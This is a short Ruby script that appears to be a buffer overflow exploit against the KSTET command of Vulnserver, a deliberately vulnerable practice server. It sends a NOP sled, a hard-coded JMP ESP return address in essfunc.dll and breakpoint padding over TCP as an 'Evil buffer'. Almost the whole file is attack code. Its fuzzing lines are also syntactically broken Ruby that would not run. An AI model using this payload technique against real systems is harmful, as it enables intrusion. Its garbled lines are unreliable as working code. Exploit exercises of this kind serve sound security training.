#!/usr/bin/env ruby

require 'socket'

host = ARGV[0]
port = ARGV[1]

commands = ["", "HELP", "STATS", "RTIME", "LTIME", "SRUN", "TRUN", "GMON", "GDOG", "HTER", "LTER", "KSTAN"]
char = "\x41"

commands.map {|c| puts send + " " + char * 500}

commands.each do {|c| send}

badHeader = "KSTET ."
badData = "\x90" * 69
badData += "\xAF\x11\x50\x62" # Memory address 0x625011AF # JMP ESP essfunc.dll
badData += "\xCC" * (1000 - badData.size)

s = TCPSocket.open(host, port)
s.recv(1024)
puts "[+] Sending Evil buffer"
s.send(badHeader + badData, 0)
s.close